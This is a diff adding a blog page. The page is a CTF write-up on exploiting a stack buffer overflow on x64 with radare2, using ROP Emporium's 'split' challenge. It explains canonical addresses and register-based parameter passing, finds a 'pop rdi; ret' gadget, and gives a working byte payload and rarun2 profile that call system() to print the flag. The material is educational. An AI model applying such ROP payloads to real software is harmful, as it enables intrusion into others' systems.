@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Buffer Overflows on x64 with radare2</title>
+        <style>
+
+    html body {
+        font-family: 'Raleway', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: #ffe135;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+
+
+
+<link rel="stylesheet" href="/css/font.css">
+
+
+ <link rel="stylesheet" href="/css/solarized-dark.min.css"> 
+
+
+<link rel="stylesheet" href="/css/bootstrap-min.css" integrity="">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/css/font-awesome.min.css" integrity="">
+ 
+
+
+    <script src="https://ps1337.github.io/js/highlight.min.js"></script>
+
+     <script src="https://ps1337.github.io/js/python.min.js"></script>  <script src="https://ps1337.github.io/js/cpp.min.js"></script>  <script src="https://ps1337.github.io/js/json.min.js"></script>  <script src="https://ps1337.github.io/js/go.min.js"></script> 
+
+    <script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-143157939-1');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="https://ps1337.github.io/js/jquery.min.js"></script>
+
+
+<script src="https://ps1337.github.io/js/bootstrap.min.js"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.55.6" />
+        
+
+        
+    </head>
+
+    
+
+
+    <body>
+         
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Buffer Overflows on x64 with radare2</a>
+
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="/">Home</a></li>
+                            
+                                <li><a href="/post/">Posts</a></li>
+                            
+                                <li><a href="/project/">Projects</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="index.xml"><i class="fa fa-rss"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=QKWKUU0XQ8U"><i class="fa fa-envira"></i></a></li>
+                            
+                        </ul>
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/x64-bof/">Buffer Overflows on x64 with radare2</a></h4>
+    <h5>July 13, 2019</h5>
+    
+    <a href="tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="tags/x64"><kbd class="item-tag">x64</kbd></a>
+    
+    <a href="tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="tags/rop"><kbd class="item-tag">rop</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<p>The approach to exploit buffer overflows on x64 is a bit different that on x86. This post demonstrates this using the <code>split</code> challenge of <a href="https://ropemporium.com/">ROP Emporium</a> while making use of <code>radare2</code>.</p>
+
+<h1 id="canonical-addresses">Canonical Addresses</h1>
+
+<p>The first thing one notices when trying to gain control over the instruction pointer is that only values of a specific range are allowed to be loaded into the <code>RIP</code> register. On x86 arbitrary values can be loaded into the instruction pointer register (<code>EIP</code>) - on x64 only <em>canonical</em> values are allowed. These are values of the following ranges:</p>
+
+<ul>
+<li><code>0x0000000000000000</code> to <code>0x00007FFFFFFFFFFF</code></li>
+<li><code>0xFFFF800000000000</code> to <code>0xFFFFFFFFFFFFFFFF</code></li>
+</ul>
+
+<p>Other values are illegal and the program aborts when attempting to load such a value into the instruction pointer register, e.g. after a <code>ret</code> instruction.</p>
+
+<h1 id="passing-parameters">Passing Parameters</h1>
+
+<p>A second aspect of x64 exploitation is that function parameters are being passed using the <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8D</code> and <code>R9D</code> <a href="https://www.felixcloutier.com/x86/ret">registers</a>. All remaining parameters are passed using the stack. This is different than the x86 semantics where parameters are being passed using the stack.</p>
+
+<p>This makes x64 exploitation a bit more difficult because function parameters have to be loaded into the respective registers prior to executing function in the target process. For this, a very small ROP payload can be used to populate the required registers first and <code>ret</code>urn or jump to the payload afterwards.</p>
+
+<p>To accomplish this, the <code>/R</code> search of <code>r2</code> can be used, e.g. like this:</p>
+
+<pre><code>r2 split -c &quot;/R pop rdi; ret&quot;
+  0x00400883                 5f  pop rdi
+  0x00400884                 c3  ret
+</code></pre>
+
+<p>This is a ROP gadget that can be used to leverage an exploit.</p>
+
+<h1 id="building-the-payload">Building The Payload</h1>
+
+<p>This gadget can be used with a payload of the following structure:</p>
+
+<ol>
+<li>Padding to cause the overflow, in this case a string of length 40 is required</li>
+<li>Address of the gadget (<code>0x00400883</code> from above): This will be the value of <code>RIP</code> after <code>ret</code>urning from the vulnerable function in the <code>split</code> binary</li>
+<li>Address of the string <code>/bin/cat flag.txt</code> in the <code>split</code> binary. Search for this using <code>e search.in=dbg.maps</code> and <code>/ /bin/cat flag.txt</code>.</li>
+<li>Address of the PLT entry of the <code>system</code> function that executes an arbitrary shell command. Use <code>aaa</code> and <code>afl</code> for this.</li>
+</ol>
+
+<p>Please note that all values have to be 8 byte value in the payload because we are dealing with x64. You can use <code>p64()</code> of <code>pwnlib</code> for this.</p>
+
+<p>Upon reaching the ROP gadget on runtime, the target process will:</p>
+
+<ol>
+<li><code>pop</code> the first value of the stack into <code>RDI</code>. At the time of executing this, the value will be the address of the desired shell command</li>
+<li><code>ret</code> <a href="https://wiki.cdot.senecacollege.ca/wiki/X86_64_Register_and_Instruction_Quick_Start">to the first value of the stack</a>. This will be the address of <code>system</code></li>
+</ol>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>You can use <code>pwnlib</code> to exploit the binary or a simple <code>printf</code> with an <code>r2</code> profile:</p>
+
+<pre><code>$ printf &quot;`python2.7 -c 'import sys; sys.stdout.write(&quot;A&quot; * 40)'`\x83\x08\x40\x00\x00\x00\x00\x00\x60\x10\x60\x00\x00\x00\x00\x00\xe0\x05\x40\x00\x00\x00\x00\x00&quot; &gt; /tmp/in
+
+$ cat &gt; /tmp/profile.rr2 &lt;&lt; EOF
+#!/usr/bin/rarun2
+program=./split
+stdin=/tmp/in
+EOF
+
+$ r2 -e dbg.profile=/tmp/profile.rr2 -d split -c &quot;dc&quot;
+</code></pre>
+
+<p>This video demonstrate the exploitation process:</p>
+
+<video width="100%" height="100%" controls preload>
+    <source src="/img/x64-bof/r2.webm"></source>
+</video>
+
+<p><br>
+Ok bye.</p>
+</div>
+
+    
+    
+
+    
+
+        <h4 class="page-header">Related</h4>
+
+         <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/binary-aslr-dep-32/">Bypassing ASLR and DEP for 32-Bit Binaries With r2</a></h4>
+    <h5>May 1, 2019</h5>
+    
+    <a href="tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+    <a href="tags/ret2libc"><kbd class="item-tag">ret2libc</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="/post/rnd-092345-gdb/">Random Note #092345: Passing binary input via GDB</a></h4>
+    <h5>October 26, 2018</h5>
+    
+    <a href="tags/randomnote"><kbd class="item-tag">randomnote</kbd></a>
+    
+    <a href="tags/gdb"><kbd class="item-tag">gdb</kbd></a>
+    
+    <a href="tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+ 
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+
+    </body>
+
+</html>
+
